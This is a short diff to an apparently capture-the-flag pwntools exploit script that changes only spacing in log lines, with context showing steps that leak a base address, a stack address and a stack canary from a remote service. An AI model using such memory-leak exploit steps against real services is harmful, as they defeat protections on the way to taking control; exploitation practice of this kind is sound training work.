@@ -15,7 +15,6 @@ if len(sys.argv) > 1:
 if len(sys.argv) > 2:
     PORT = sys.argv[2]
 
-
 io = remote(HOST, PORT)
 print io.recvuntil('5!\n')
 
@@ -26,8 +25,8 @@ leak = io.recvline().strip()
 leak = u64(leak.ljust(8, '\x00'))
 base = leak - BASE
 
-log.info('leak:  0x%012x' % leak)
-log.info('base:  0x%012x' % base)
+log.info('leak:      0x%012x' % leak)
+log.info('base:      0x%012x' % base)
 
 # step 2: leak stack address
 io.sendline('x'*0x40)
@@ -36,7 +35,7 @@ leak = io.recvline().strip()
 leak = u64(leak.ljust(8, '\x00'))
 
 stack = leak - STACK
-log.info('stack: 0x%012x' % stack)
+log.info('stack:     0x%012x' % stack)
 
 # step 3: leak canary
 io.sendline('x'*0x49)
